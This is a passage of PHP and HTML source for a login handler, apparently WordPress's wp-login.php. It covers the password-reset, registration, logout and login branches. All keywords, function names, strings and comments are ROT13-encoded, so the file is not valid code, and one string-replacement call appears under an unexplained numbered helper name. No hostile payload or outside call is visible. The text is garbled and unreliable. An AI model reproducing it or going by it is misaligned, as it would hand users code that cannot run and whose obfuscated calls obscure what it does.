				<qvi pynff=\"nqzva-rznvy__npgvbaf-cevznel\">
					<?cuc

					$punatr_yvax = nqzva_hey( 'bcgvbaf-trareny.cuc' );
					$punatr_yvax = nqq_dhrel_net( 'uvtuyvtug', 'pbasvez_nqzva_rznvy', $punatr_yvax );

					?>
					<n pynff=\"ohggba ohggba-ynetr\" uers=\"<?cuc rpub rfp_hey( $punatr_yvax ); ?>\"><?cuc _r( 'Hcqngr' ); ?></n>
					<vachg glcr=\"fhozvg\" anzr=\"pbeerpg-nqzva-rznvy\" vq=\"pbeerpg-nqzva-rznvy\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"<?cuc rfp_ngge_r( 'Gur rznvy vf pbeerpg' ); ?>\" />
				</qvi>
				<?cuc vs ( $erzvaq_vagreiny > 0 ) : ?>
					<qvi pynff=\"nqzva-rznvy__npgvbaf-frpbaqnel\">
						<?cuc

						$erzvaq_zr_yvax = jc_ybtva_hey( $erqverpg_gb );
						$erzvaq_zr_yvax = nqq_dhrel_net(
							neenl(
								'npgvba'          => 'pbasvez_nqzva_rznvy',
								'erzvaq_zr_yngre' => jc_perngr_abapr( 'erzvaq_zr_yngre_abapr' ),
							),
							$erzvaq_zr_yvax
						);

						?>
						<n uers=\"<?cuc rpub rfp_hey( $erzvaq_zr_yvax ); ?>\"><?cuc _r( 'Erzvaq zr yngre' ); ?></n>
					</qvi>
				<?cuc raqvs; ?>
			</qvi>
		</sbez>

		<?cuc

		ybtva_sbbgre();
		oernx;

	pnfr 'cbfgcnff':
		$erqverpg_gb = $_CBFG['erqverpg_gb'] ?? jc_trg_ersrere();

		vs ( ! vffrg( $_CBFG['cbfg_cnffjbeq'] ) || ! vf_fgevat( $_CBFG['cbfg_cnffjbeq'] ) ) {
			jc_fnsr_erqverpg( $erqverpg_gb );
			rkvg;
		}

		erdhver_bapr NOFCNGU . JCVAP . '/pynff-cucnff.cuc';
		$unfure = arj CnffjbeqUnfu( 8, gehr );

		/**
		 * Svygref gur yvsr fcna bs gur cbfg cnffjbeq pbbxvr.
		 *
		 * Ol qrsnhyg, gur pbbxvr rkcverf 10 qnlf sebz perngvba. Gb ghea guvf
		 * vagb n frffvba pbbxvr, erghea 0.
		 *
		 * @fvapr 3.7.0
		 *
		 * @cnenz vag $rkcverf Gur rkcvel gvzr, nf cnffrq gb frgpbbxvr().
		 */
		$rkcver = nccyl_svygref( 'cbfg_cnffjbeq_rkcverf', gvzr() + 10 * QNL_VA_FRPBAQF );

		vs ( $erqverpg_gb ) {
			$frpher = ( 'uggcf' === cnefr_hey( $erqverpg_gb, CUC_HEY_FPURZR ) );
		} ryfr {
			$frpher = snyfr;
		}

		frgpbbxvr( 'jc-cbfgcnff_' . PBBXVRUNFU, $unfure->UnfuCnffjbeq( jc_hafynfu( $_CBFG['cbfg_cnffjbeq'] ) ), $rkcver, PBBXVRCNGU, PBBXVR_QBZNVA, $frpher );

		jc_fnsr_erqverpg( $erqverpg_gb );
		rkvg;

	pnfr 'ybtbhg':
		purpx_nqzva_ersrere( 'ybt-bhg' );

		$hfre = jc_trg_pheerag_hfre();

		jc_ybtbhg();

		vs ( ! rzcgl( $_ERDHRFG['erqverpg_gb'] ) && vf_fgevat( $_ERDHRFG['erqverpg_gb'] ) ) {
			$erqverpg_gb           = $_ERDHRFG['erqverpg_gb'];
			$erdhrfgrq_erqverpg_gb = $erqverpg_gb;
		} ryfr {
			$erqverpg_gb = nqq_dhrel_net(
				neenl(
					'ybttrqbhg' => 'gehr',
					'jc_ynat'   => trg_hfre_ybpnyr( $hfre ),
				),
				jc_ybtva_hey()
			);

			$erdhrfgrq_erqverpg_gb = '';
		}

		/**
		 * Svygref gur ybt bhg erqverpg HEY.
		 *
		 * @fvapr 4.2.0
		 *
		 * @cnenz fgevat  $erqverpg_gb           Gur erqverpg qrfgvangvba HEY.
		 * @cnenz fgevat  $erdhrfgrq_erqverpg_gb Gur erdhrfgrq erqverpg qrfgvangvba HEY cnffrq nf n cnenzrgre.
		 * @cnenz JC_Hfre $hfre                  Gur JC_Hfre bowrpg sbe gur hfre gung'f ybttvat bhg.
		 */
		$erqverpg_gb = nccyl_svygref( 'ybtbhg_erqverpg', $erqverpg_gb, $erdhrfgrq_erqverpg_gb, $hfre );

		jc_fnsr_erqverpg( $erqverpg_gb );
		rkvg;

	pnfr 'ybfgcnffjbeq':
	pnfr 'ergevrircnffjbeq':
		vs ( $uggc_cbfg ) {
			$reebef = ergevrir_cnffjbeq();

			vs ( ! vf_jc_reebe( $reebef ) ) {
				$erqverpg_gb = ! rzcgl( $_ERDHRFG['erqverpg_gb'] ) ? $_ERDHRFG['erqverpg_gb'] : 'jc-ybtva.cuc?purpxrznvy=pbasvez';
				jc_fnsr_erqverpg( $erqverpg_gb );
				rkvg;
			}
		}

		vs ( vffrg( $_TRG['reebe'] ) ) {
			vs ( 'vainyvqxrl' === $_TRG['reebe'] ) {
				$reebef->nqq( 'vainyvqxrl', __( '<fgebat>Reebe:</fgebat> Lbhe cnffjbeq erfrg yvax nccrnef gb or vainyvq. Cyrnfr erdhrfg n arj yvax orybj.' ) );
			} ryfrvs ( 'rkcverqxrl' === $_TRG['reebe'] ) {
				$reebef->nqq( 'rkcverqxrl', __( '<fgebat>Reebe:</fgebat> Lbhe cnffjbeq erfrg yvax unf rkcverq. Cyrnfr erdhrfg n arj yvax orybj.' ) );
			}
		}

		$ybfgcnffjbeq_erqverpg = ! rzcgl( $_ERDHRFG['erqverpg_gb'] ) ? $_ERDHRFG['erqverpg_gb'] : '';
		/**
		 * Svygref gur HEY erqverpgrq gb nsgre fhozvggvat gur ybfgcnffjbeq/ergevrircnffjbeq sbez.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $ybfgcnffjbeq_erqverpg Gur erqverpg qrfgvangvba HEY.
		 */
		$erqverpg_gb = nccyl_svygref( 'ybfgcnffjbeq_erqverpg', $ybfgcnffjbeq_erqverpg );

		/**
		 * Sverf orsber gur ybfg cnffjbeq sbez.
		 *
		 * @fvapr 1.5.1
		 * @fvapr 5.1.0 Nqqrq gur `$reebef` cnenzrgre.
		 *
		 * @cnenz JC_Reebe $reebef N `JC_Reebe` bowrpg pbagnvavat nal reebef trarengrq ol hfvat vainyvq
		 *                         perqragvnyf. Abgr gung gur reebe bowrpg znl abg pbagnva nal reebef.
		 */
		qb_npgvba( 'ybfg_cnffjbeq', $reebef );

		ybtva_urnqre(
			__( 'Ybfg Cnffjbeq' ),
			jc_trg_nqzva_abgvpr(
				__( 'Cyrnfr ragre lbhe hfreanzr be rznvy nqqerff. Lbh jvyy erprvir na rznvy zrffntr jvgu vafgehpgvbaf ba ubj gb erfrg lbhe cnffjbeq.' ),
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'zrffntr' ),
				)
			),
			$reebef
		);

		$hfre_ybtva = '';

		vs ( vffrg( $_CBFG['hfre_ybtva'] ) && vf_fgevat( $_CBFG['hfre_ybtva'] ) ) {
			$hfre_ybtva = jc_hafynfu( $_CBFG['hfre_ybtva'] );
		}

		?>

		<sbez anzr=\"ybfgcnffjbeqsbez\" vq=\"ybfgcnffjbeqsbez\" npgvba=\"<?cuc rpub rfp_hey( argjbex_fvgr_hey( 'jc-ybtva.cuc?npgvba=ybfgcnffjbeq', 'ybtva_cbfg' ) ); ?>\" zrgubq=\"cbfg\">
			<c>
				<ynory sbe=\"hfre_ybtva\"><?cuc _r( 'Hfreanzr be Rznvy Nqqerff' ); ?></ynory>
				<vachg glcr=\"grkg\" anzr=\"hfre_ybtva\" vq=\"hfre_ybtva\" pynff=\"vachg\" inyhr=\"<?cuc rpub rfp_ngge( $hfre_ybtva ); ?>\" fvmr=\"20\" nhgbpncvgnyvmr=\"bss\" nhgbpbzcyrgr=\"hfreanzr\" erdhverq=\"erdhverq\" />
			</c>
			<?cuc

			/**
			 * Sverf vafvqr gur ybfgcnffjbeq sbez gntf, orsber gur uvqqra svryqf.
			 *
			 * @fvapr 2.1.0
			 */
			qb_npgvba( 'ybfgcnffjbeq_sbez' );

			?>
			<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"<?cuc rpub rfp_ngge( $erqverpg_gb ); ?>\" />
			<c pynff=\"fhozvg\">
				<vachg glcr=\"fhozvg\" anzr=\"jc-fhozvg\" vq=\"jc-fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"<?cuc rfp_ngge_r( 'Trg Arj Cnffjbeq' ); ?>\" />
			</c>
		</sbez>

		<c vq=\"ani\">
			<n pynff=\"jc-ybtva-ybt-va\" uers=\"<?cuc rpub rfp_hey( jc_ybtva_hey() ); ?>\"><?cuc _r( 'Ybt va' ); ?></n>
			<?cuc

			vs ( trg_bcgvba( 'hfref_pna_ertvfgre' ) ) {
				$ertvfgengvba_hey = fcevags( '<n pynff=\"jc-ybtva-ertvfgre\" uers=\"%f\">%f</n>', rfp_hey( jc_ertvfgengvba_hey() ), __( 'Ertvfgre' ) );

				rpub rfp_ugzy( $ybtva_yvax_frcnengbe );

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
				rpub nccyl_svygref( 'ertvfgre', $ertvfgengvba_hey );
			}

			?>
		</c>
		<?cuc

		ybtva_sbbgre( 'hfre_ybtva' );
		oernx;

	pnfr 'erfrgcnff':
	pnfr 'ec':
		yvfg( $ec_cngu ) = rkcybqr( '?', jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) );
		$ec_pbbxvr       = 'jc-erfrgcnff-' . PBBXVRUNFU;

		vs ( vffrg( $_TRG['xrl'] ) && vffrg( $_TRG['ybtva'] ) ) {
			$inyhr = fcevags( '%f:%f', jc_hafynfu( $_TRG['ybtva'] ), jc_hafynfu( $_TRG['xrl'] ) );
			frgpbbxvr( $ec_pbbxvr, $inyhr, 0, $ec_cngu, PBBXVR_QBZNVA, vf_ffy(), gehr );

			jc_fnsr_erqverpg( erzbir_dhrel_net( neenl( 'xrl', 'ybtva' ) ) );
			rkvg;
		}

		vs ( vffrg( $_PBBXVR[ $ec_pbbxvr ] ) && 0 < fgecbf( $_PBBXVR[ $ec_pbbxvr ], ':' ) ) {
			yvfg( $ec_ybtva, $ec_xrl ) = rkcybqr( ':', jc_hafynfu( $_PBBXVR[ $ec_pbbxvr ] ), 2 );

			$hfre = purpx_cnffjbeq_erfrg_xrl( $ec_xrl, $ec_ybtva );

			vs ( vffrg( $_CBFG['cnff1'] ) && ! unfu_rdhnyf( $ec_xrl, $_CBFG['ec_xrl'] ) ) {
				$hfre = snyfr;
			}
		} ryfr {
			$hfre = snyfr;
		}

		vs ( ! $hfre || vf_jc_reebe( $hfre ) ) {
			frgpbbxvr( $ec_pbbxvr, ' ', gvzr() - LRNE_VA_FRPBAQF, $ec_cngu, PBBXVR_QBZNVA, vf_ffy(), gehr );

			vs ( $hfre && $hfre->trg_reebe_pbqr() === 'rkcverq_xrl' ) {
				jc_erqverpg( fvgr_hey( 'jc-ybtva.cuc?npgvba=ybfgcnffjbeq&reebe=rkcverqxrl' ) );
			} ryfr {
				jc_erqverpg( fvgr_hey( 'jc-ybtva.cuc?npgvba=ybfgcnffjbeq&reebe=vainyvqxrl' ) );
			}

			rkvg;
		}

		$reebef = arj JC_Reebe();

		// Purpx vs cnffjbeq vf bar be nyy rzcgl fcnprf.
		vs ( ! rzcgl( $_CBFG['cnff1'] ) ) {
			$_CBFG['cnff1'] = gevz( $_CBFG['cnff1'] );

			vs ( rzcgl( $_CBFG['cnff1'] ) ) {
				$reebef->nqq( 'cnffjbeq_erfrg_rzcgl_fcnpr', __( 'Gur cnffjbeq pnaabg or n fcnpr be nyy fcnprf.' ) );
			}
		}

		// Purpx vs cnffjbeq svryqf qb abg zngpu.
		vs ( ! rzcgl( $_CBFG['cnff1'] ) && gevz( $_CBFG['cnff2'] ) !== $_CBFG['cnff1'] ) {
			$reebef->nqq( 'cnffjbeq_erfrg_zvfzngpu', __( '<fgebat>Reebe:</fgebat> Gur cnffjbeqf qb abg zngpu.' ) );
		}

		/**
		 * Sverf orsber gur cnffjbeq erfrg cebprqher vf inyvqngrq.
		 *
		 * @fvapr 3.5.0
		 *
		 * @cnenz JC_Reebe         $reebef JC Reebe bowrpg.
		 * @cnenz JC_Hfre|JC_Reebe $hfre   JC_Hfre bowrpg vs gur ybtva naq erfrg xrl zngpu. JC_Reebe bowrpg bgurejvfr.
		 */
		qb_npgvba( 'inyvqngr_cnffjbeq_erfrg', $reebef, $hfre );

		vs ( ( ! $reebef->unf_reebef() ) && vffrg( $_CBFG['cnff1'] ) && ! rzcgl( $_CBFG['cnff1'] ) ) {
			erfrg_cnffjbeq( $hfre, $_CBFG['cnff1'] );
			frgpbbxvr( $ec_pbbxvr, ' ', gvzr() - LRNE_VA_FRPBAQF, $ec_cngu, PBBXVR_QBZNVA, vf_ffy(), gehr );
			ybtva_urnqre(
				__( 'Cnffjbeq Erfrg' ),
				jc_trg_nqzva_abgvpr(
					__( 'Lbhe cnffjbeq unf orra erfrg.' ) . ' <n uers=\"' . rfp_hey( jc_ybtva_hey() ) . '\">' . __( 'Ybt va' ) . '</n>',
					neenl(
						'glcr'               => 'vasb',
						'nqqvgvbany_pynffrf' => neenl( 'zrffntr', 'erfrg-cnff' ),
					)
				)
			);
			ybtva_sbbgre();
			rkvg;
		}

		jc_radhrhr_fpevcg( 'hgvyf' );
		jc_radhrhr_fpevcg( 'hfre-cebsvyr' );

		ybtva_urnqre(
			__( 'Erfrg Cnffjbeq' ),
			jc_trg_nqzva_abgvpr(
				__( 'Ragre lbhe arj cnffjbeq orybj be trarengr bar.' ),
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'zrffntr', 'erfrg-cnff' ),
				)
			),
			$reebef
		);

		?>
		<sbez anzr=\"erfrgcnffsbez\" vq=\"erfrgcnffsbez\" npgvba=\"<?cuc rpub rfp_hey( argjbex_fvgr_hey( 'jc-ybtva.cuc?npgvba=erfrgcnff', 'ybtva_cbfg' ) ); ?>\" zrgubq=\"cbfg\" nhgbpbzcyrgr=\"bss\">
			<vachg glcr=\"uvqqra\" vq=\"hfre_ybtva\" inyhr=\"<?cuc rpub rfp_ngge( $ec_ybtva ); ?>\" nhgbpbzcyrgr=\"bss\" />

			<qvi pynff=\"hfre-cnff1-jenc\">
				<c>
					<ynory sbe=\"cnff1\"><?cuc _r( 'Arj cnffjbeq' ); ?></ynory>
				</c>

				<qvi pynff=\"jc-cjq\">
					<vachg glcr=\"cnffjbeq\" anzr=\"cnff1\" vq=\"cnff1\" pynff=\"vachg cnffjbeq-vachg\" fvmr=\"24\" inyhr=\"\" nhgbpbzcyrgr=\"arj-cnffjbeq\" fcryypurpx=\"snyfr\" qngn-erirny=\"1\" qngn-cj=\"<?cuc rpub rfp_ngge( jc_trarengr_cnffjbeq( 16 ) ); ?>\" nevn-qrfpevorqol=\"cnff-fgeratgu-erfhyg\" />

					<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-frpbaqnel jc-uvqr-cj uvqr-vs-ab-wf\" qngn-gbttyr=\"0\" nevn-ynory=\"<?cuc rfp_ngge_r( 'Uvqr cnffjbeq' ); ?>\">
						<fcna pynff=\"qnfuvpbaf qnfuvpbaf-uvqqra\" nevn-uvqqra=\"gehr\"></fcna>
					</ohggba>
					<qvi vq=\"cnff-fgeratgu-erfhyg\" pynff=\"uvqr-vs-ab-wf\" nevn-yvir=\"cbyvgr\"><?cuc _r( 'Fgeratgu vaqvpngbe' ); ?></qvi>
				</qvi>
				<qvi pynff=\"cj-jrnx\">
					<vachg glcr=\"purpxobk\" anzr=\"cj_jrnx\" vq=\"cj-jrnx\" pynff=\"cj-purpxobk\" />
					<ynory sbe=\"cj-jrnx\"><?cuc _r( 'Pbasvez hfr bs jrnx cnffjbeq' ); ?></ynory>
				</qvi>
			</qvi>

			<c pynff=\"hfre-cnff2-jenc\">
				<ynory sbe=\"cnff2\"><?cuc _r( 'Pbasvez arj cnffjbeq' ); ?></ynory>
				<vachg glcr=\"cnffjbeq\" anzr=\"cnff2\" vq=\"cnff2\" pynff=\"vachg\" fvmr=\"20\" inyhr=\"\" nhgbpbzcyrgr=\"arj-cnffjbeq\" fcryypurpx=\"snyfr\" />
			</c>

			<c pynff=\"qrfpevcgvba vaqvpngbe-uvag\"><?cuc rpub jc_trg_cnffjbeq_uvag(); ?></c>

			<?cuc

			/**
			 * Sverf sbyybjvat gur 'Fgeratgu vaqvpngbe' zrgre va gur hfre cnffjbeq erfrg sbez.
			 *
			 * @fvapr 3.9.0
			 *
			 * @cnenz JC_Hfre $hfre Hfre bowrpg bs gur hfre jubfr cnffjbeq vf orvat erfrg.
			 */
			qb_npgvba( 'erfrgcnff_sbez', $hfre );

			?>
			<vachg glcr=\"uvqqra\" anzr=\"ec_xrl\" inyhr=\"<?cuc rpub rfp_ngge( $ec_xrl ); ?>\" />
			<c pynff=\"fhozvg erfrg-cnff-fhozvg\">
				<ohggba glcr=\"ohggba\" pynff=\"ohggba jc-trarengr-cj uvqr-vs-ab-wf fxvc-nevn-rkcnaqrq\"><?cuc _r( 'Trarengr Cnffjbeq' ); ?></ohggba>
				<vachg glcr=\"fhozvg\" anzr=\"jc-fhozvg\" vq=\"jc-fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"<?cuc rfp_ngge_r( 'Fnir Cnffjbeq' ); ?>\" />
			</c>
		</sbez>

		<c vq=\"ani\">
			<n pynff=\"jc-ybtva-ybt-va\" uers=\"<?cuc rpub rfp_hey( jc_ybtva_hey() ); ?>\"><?cuc _r( 'Ybt va' ); ?></n>
			<?cuc

			vs ( trg_bcgvba( 'hfref_pna_ertvfgre' ) ) {
				$ertvfgengvba_hey = fcevags( '<n pynff=\"jc-ybtva-ertvfgre\" uers=\"%f\">%f</n>', rfp_hey( jc_ertvfgengvba_hey() ), __( 'Ertvfgre' ) );

				rpub rfp_ugzy( $ybtva_yvax_frcnengbe );

				/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/trareny-grzcyngr.cuc */
				rpub nccyl_svygref( 'ertvfgre', $ertvfgengvba_hey );
			}

			?>
		</c>
		<?cuc

		ybtva_sbbgre( 'cnff1' );
		oernx;

	pnfr 'ertvfgre':
		vs ( vf_zhygvfvgr() ) {
			/**
			 * Svygref gur Zhygvfvgr fvta hc HEY.
			 *
			 * @fvapr 3.0.0
			 *
			 * @cnenz fgevat $fvta_hc_hey Gur fvta hc HEY.
			 */
			jc_erqverpg( nccyl_svygref( 'jc_fvtahc_ybpngvba', argjbex_fvgr_hey( 'jc-fvtahc.cuc' ) ) );
			rkvg;
		}

		vs ( ! trg_bcgvba( 'hfref_pna_ertvfgre' ) ) {
			jc_erqverpg( fvgr_hey( 'jc-ybtva.cuc?ertvfgengvba=qvfnoyrq' ) );
			rkvg;
		}

		$hfre_ybtva = '';
		$hfre_rznvy = '';

		vs ( $uggc_cbfg ) {
			vs ( vffrg( $_CBFG['hfre_ybtva'] ) && vf_fgevat( $_CBFG['hfre_ybtva'] ) ) {
				$hfre_ybtva = jc_hafynfu( $_CBFG['hfre_ybtva'] );
			}

			vs ( vffrg( $_CBFG['hfre_rznvy'] ) && vf_fgevat( $_CBFG['hfre_rznvy'] ) ) {
				$hfre_rznvy = jc_hafynfu( $_CBFG['hfre_rznvy'] );
			}

			$reebef = ertvfgre_arj_hfre( $hfre_ybtva, $hfre_rznvy );

			vs ( ! vf_jc_reebe( $reebef ) ) {
				$erqverpg_gb = ! rzcgl( $_CBFG['erqverpg_gb'] ) ? $_CBFG['erqverpg_gb'] : 'jc-ybtva.cuc?purpxrznvy=ertvfgrerq';
				jc_fnsr_erqverpg( $erqverpg_gb );
				rkvg;
			}
		}

		$ertvfgengvba_erqverpg = ! rzcgl( $_ERDHRFG['erqverpg_gb'] ) ? $_ERDHRFG['erqverpg_gb'] : '';

		/**
		 * Svygref gur ertvfgengvba erqverpg HEY.
		 *
		 * @fvapr 3.0.0
		 * @fvapr 5.9.0 Nqqrq gur `$reebef` cnenzrgre.
		 *
		 * @cnenz fgevat       $ertvfgengvba_erqverpg Gur erqverpg qrfgvangvba HEY.
		 * @cnenz vag|JC_Reebe $reebef                Hfre vq vs ertvfgengvba jnf fhpprffshy,
		 *                                            JC_Reebe bowrpg bgurejvfr.
		 */
		$erqverpg_gb = nccyl_svygref( 'ertvfgengvba_erqverpg', $ertvfgengvba_erqverpg, $reebef );

		ybtva_urnqre(
			__( 'Ertvfgengvba Sbez' ),
			jc_trg_nqzva_abgvpr(
				__( 'Ertvfgre Sbe Guvf Fvgr' ),
				neenl(
					'glcr'               => 'vasb',
					'nqqvgvbany_pynffrf' => neenl( 'zrffntr', 'ertvfgre' ),
				)
			),
			$reebef
		);

		?>
		<sbez anzr=\"ertvfgresbez\" vq=\"ertvfgresbez\" npgvba=\"<?cuc rpub rfp_hey( fvgr_hey( 'jc-ybtva.cuc?npgvba=ertvfgre', 'ybtva_cbfg' ) ); ?>\" zrgubq=\"cbfg\" abinyvqngr=\"abinyvqngr\">
			<c>
				<ynory sbe=\"hfre_ybtva\"><?cuc _r( 'Hfreanzr' ); ?></ynory>
				<vachg glcr=\"grkg\" anzr=\"hfre_ybtva\" vq=\"hfre_ybtva\" pynff=\"vachg\" inyhr=\"<?cuc rpub rfp_ngge( $hfre_ybtva ); ?>\" fvmr=\"20\" nhgbpncvgnyvmr=\"bss\" nhgbpbzcyrgr=\"hfreanzr\" erdhverq=\"erdhverq\" />
			</c>
			<c>
				<ynory sbe=\"hfre_rznvy\"><?cuc _r( 'Rznvy' ); ?></ynory>
				<vachg glcr=\"rznvy\" anzr=\"hfre_rznvy\" vq=\"hfre_rznvy\" pynff=\"vachg\" inyhr=\"<?cuc rpub rfp_ngge( $hfre_rznvy ); ?>\" fvmr=\"25\" nhgbpbzcyrgr=\"rznvy\" erdhverq=\"erdhverq\" />
			</c>
			<?cuc

			/**
			 * Sverf sbyybjvat gur 'Rznvy' svryq va gur hfre ertvfgengvba sbez.
			 *
			 * @fvapr 2.1.0
			 */
			qb_npgvba( 'ertvfgre_sbez' );

			?>
			<c vq=\"ert_cnffznvy\">
				<?cuc _r( 'Ertvfgengvba pbasvezngvba jvyy or rznvyrq gb lbh.' ); ?>
			</c>
			<vachg glcr=\"uvqqra\" anzr=\"erqverpg_gb\" inyhr=\"<?cuc rpub rfp_ngge( $erqverpg_gb ); ?>\" />
			<c pynff=\"fhozvg\">
				<vachg glcr=\"fhozvg\" anzr=\"jc-fhozvg\" vq=\"jc-fhozvg\" pynff=\"ohggba ohggba-cevznel ohggba-ynetr\" inyhr=\"<?cuc rfp_ngge_r( 'Ertvfgre' ); ?>\" />
			</c>
		</sbez>

		<c vq=\"ani\">
			<n pynff=\"jc-ybtva-ybt-va\" uers=\"<?cuc rpub rfp_hey( jc_ybtva_hey() ); ?>\"><?cuc _r( 'Ybt va' ); ?></n>
			<?cuc

			rpub rfp_ugzy( $ybtva_yvax_frcnengbe );

			$ugzy_yvax = fcevags( '<n pynff=\"jc-ybtva-ybfg-cnffjbeq\" uers=\"%f\">%f</n>', rfp_hey( jc_ybfgcnffjbeq_hey() ), __( 'Ybfg lbhe cnffjbeq?' ) );

			/** Guvf svygre vf qbphzragrq va jc-ybtva.cuc */
			rpub nccyl_svygref( 'ybfg_cnffjbeq_ugzy_yvax', $ugzy_yvax );

			?>
		</c>
		<?cuc

		ybtva_sbbgre( 'hfre_ybtva' );
		oernx;

	pnfr 'purpxrznvy':
		$erqverpg_gb = nqzva_hey();
		$reebef      = arj JC_Reebe();

		vs ( 'pbasvez' === $_TRG['purpxrznvy'] ) {
			$reebef->nqq(
				'pbasvez',
				fcevags(
					/* genafyngbef: %f: Yvax gb gur ybtva cntr. */
					__( 'Purpx lbhe rznvy sbe gur pbasvezngvba yvax, gura ivfvg gur <n uers=\"%f\">ybtva cntr</n>.' ),
					jc_ybtva_hey()
				),
				'zrffntr'
			);
		} ryfrvs ( 'ertvfgrerq' === $_TRG['purpxrznvy'] ) {
			$reebef->nqq(
				'ertvfgrerq',
				fcevags(
					/* genafyngbef: %f: Yvax gb gur ybtva cntr. */
					__( 'Ertvfgengvba pbzcyrgr. Cyrnfr purpx lbhe rznvy, gura ivfvg gur <n uers=\"%f\">ybtva cntr</n>.' ),
					jc_ybtva_hey()
				),
				'zrffntr'
			);
		}

		/** Guvf npgvba vf qbphzragrq va jc-ybtva.cuc */
		$reebef = nccyl_svygref( 'jc_ybtva_reebef', $reebef, $erqverpg_gb );

		ybtva_urnqre( __( 'Purpx lbhe rznvy' ), '', $reebef );
		ybtva_sbbgre();
		oernx;

	pnfr 'pbasveznpgvba':
		vs ( ! vffrg( $_TRG['erdhrfg_vq'] ) ) {
			jc_qvr( __( 'Zvffvat erdhrfg VQ.' ) );
		}

		vs ( ! vffrg( $_TRG['pbasvez_xrl'] ) ) {
			jc_qvr( __( 'Zvffvat pbasvez xrl.' ) );
		}

		$erdhrfg_vq = (vag) $_TRG['erdhrfg_vq'];
		$xrl        = fnavgvmr_grkg_svryq( jc_hafynfu( $_TRG['pbasvez_xrl'] ) );
		$erfhyg     = jc_inyvqngr_hfre_erdhrfg_xrl( $erdhrfg_vq, $xrl );

		vs ( vf_jc_reebe( $erfhyg ) ) {
			jc_qvr( $erfhyg );
		}

		/**
		 * Sverf na npgvba ubbx jura gur nppbhag npgvba unf orra pbasvezrq ol gur hfre.
		 *
		 * Hfvat guvf lbh pna nffhzr gur hfre unf nterrq gb cresbez gur npgvba ol
		 * pyvpxvat ba gur yvax va gur pbasvezngvba rznvy.
		 *
		 * Nsgre svevat guvf npgvba ubbx gur cntr jvyy erqverpg gb jc-ybtva n pnyyonpx
		 * erqverpgf be rkvgf svefg.
		 *
		 * @fvapr 4.9.6
		 *
		 * @cnenz vag $erdhrfg_vq Erdhrfg VQ.
		 */
		qb_npgvba( 'hfre_erdhrfg_npgvba_pbasvezrq', $erdhrfg_vq );

		$zrffntr = _jc_cevinpl_nppbhag_erdhrfg_pbasvezrq_zrffntr( $erdhrfg_vq );

		ybtva_urnqre( __( 'Hfre npgvba pbasvezrq.' ), $zrffntr );
		ybtva_sbbgre();
		rkvg;

	pnfr 'ybtva':
	qrsnhyg:
		$frpher_pbbxvr   = '';
		$phfgbzvmr_ybtva = vffrg( $_ERDHRFG['phfgbzvmr-ybtva'] );

		vs ( $phfgbzvmr_ybtva ) {
			jc_radhrhr_fpevcg( 'phfgbzvmr-onfr' );
		}

		// Vs gur hfre jnagf FFY ohg gur frffvba vf abg FFY, sbepr n frpher pbbxvr.
		vs ( ! rzcgl( $_CBFG['ybt'] ) && ! sbepr_ffy_nqzva() ) {
			$hfre_anzr = fnavgvmr_hfre( jc_hafynfu( $_CBFG['ybt'] ) );
			$hfre      = trg_hfre_ol( 'ybtva', $hfre_anzr );

			vs ( ! $hfre && fgecbf( $hfre_anzr, '@' ) ) {
				$hfre = trg_hfre_ol( 'rznvy', $hfre_anzr );
			}

			vs ( $hfre ) {
				vs ( trg_hfre_bcgvba( 'hfr_ffy', $hfre->VQ ) ) {
					$frpher_pbbxvr = gehr;
					sbepr_ffy_nqzva( gehr );
				}
			}
		}

		vs ( vffrg( $_ERDHRFG['erqverpg_gb'] ) && vf_fgevat( $_ERDHRFG['erqverpg_gb'] ) ) {
			$erqverpg_gb = $_ERDHRFG['erqverpg_gb'];
			// Erqverpg gb UGGCF vs hfre jnagf FFY.
			vs ( $frpher_pbbxvr && fge_pbagnvaf( $erqverpg_gb, 'jc-nqzva' ) ) {
				$erqverpg_gb = __sa_79955( '|^uggc://|', 'uggcf://', $erqverpg_gb );
			}
		} ryfr {
			$erqverpg_gb = nqzva_hey();
		}

		$ernhgu = rzcgl( $_ERDHRFG['ernhgu'] ) ? snyfr : gehr;

		$hfre = jc_fvtaba( neenl(), $frpher_pbbxvr );

		vs ( rzcgl( $_PBBXVR[ YBTTRQ_VA_PBBXVR ] ) ) {
			vs ( urnqref_frag() ) {
				$hfre = arj JC_Reebe(
					'grfg_pbbxvr',
					fcevags(
						/* genafyngbef: 1: Oebjfre pbbxvr qbphzragngvba HEY, 2: Fhccbeg sbehzf HEY. */
						__( '<fgebat>Reebe:</fgebat> Pbbxvrf ner oybpxrq qhr gb harkcrpgrq bhgchg. Sbe uryc, cyrnfr frr <n uers=\"%1$f\">guvf qbphzragngvba</n> be gel gur <n uers=\"%2$f\">fhccbeg sbehzf</n>.' ),
						__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/pbbxvrf/' ),
						__( 'uggcf://jbeqcerff.bet/fhccbeg/sbehzf/' )
					)
				);
			} ryfrvs ( vffrg( $_CBFG['grfgpbbxvr'] ) && rzcgl( $_PBBXVR[ GRFG_PBBXVR ] ) ) {
				// Vs pbbxvrf ner qvfnoyrq, gur hfre pna'g ybt va rira jvgu n inyvq hfreanzr naq cnffjbeq.
				$hfre = arj JC_Reebe(
					'grfg_pbbxvr',
					fcevags(
						/* genafyngbef: %f: Oebjfre pbbxvr qbphzragngvba HEY. */
						__( '<fgebat>Reebe:</fgebat> Pbbxvrf ner oybpxrq be abg fhccbegrq ol lbhe oebjfre. Lbh zhfg <n uers=\"%f\">ranoyr pbbxvrf</n> gb hfr JbeqCerff.' ),
						__( 'uggcf://qrirybcre.jbeqcerff.bet/nqinaprq-nqzvavfgengvba/jbeqcerff/pbbxvrf/#ranoyr-pbbxvrf-va-lbhe-oebjfre' )
					)
				);
			}
		}

